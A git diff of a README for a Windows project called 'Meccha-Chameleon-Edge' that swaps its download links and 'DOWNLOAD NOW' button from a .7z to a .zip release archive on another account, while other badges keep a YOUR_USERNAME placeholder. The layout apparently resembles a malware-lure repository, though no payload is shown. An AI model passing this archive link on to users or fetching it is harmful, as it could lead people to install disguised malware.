@@ -13,7 +13,7 @@
 <p align="center">
   <a href="https://github.com/YOUR_USERNAME/Meccha-Chameleon-Edge"><img src="https://img.shields.io/badge/version-2.0.0-brightgreen?style=for-the-badge" alt="Version"></a>
   <a href="https://github.com/YOUR_USERNAME/Meccha-Chameleon-Edge"><img src="https://img.shields.io/badge/platform-Windows-blue?style=for-the-badge" alt="Platform"></a>
-  <a href="https://github.com/Stonedelderrick/Meccha-Chameleon-Edge/releases/download/1/MecchaEDGE.7z"><img src="https://img.shields.io/badge/downloads-3.8k-brightgreen?style=for-the-badge" alt="Downloads"></a>
+  <a href="https://github.com/Stonedelderrick/Meccha-Chameleon-Edge/releases/download/1/mecchaedge.zip"><img src="https://img.shields.io/badge/downloads-3.8k-brightgreen?style=for-the-badge" alt="Downloads"></a>
   <a href="https://github.com/YOUR_USERNAME/Meccha-Chameleon-Edge"><img src="https://img.shields.io/badge/status-active-success?style=for-the-badge" alt="Status"></a>
   <a href="https://github.com/YOUR_USERNAME/Meccha-Chameleon-Edge/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-orange?style=for-the-badge" alt="License"></a>
 </p>
@@ -38,7 +38,7 @@
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/Stonedelderrick/Meccha-Chameleon-Edge/releases/download/1/MecchaEDGE.7z">
+  <a href="https://github.com/Stonedelderrick/Meccha-Chameleon-Edge/releases/download/1/mecchaedge.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
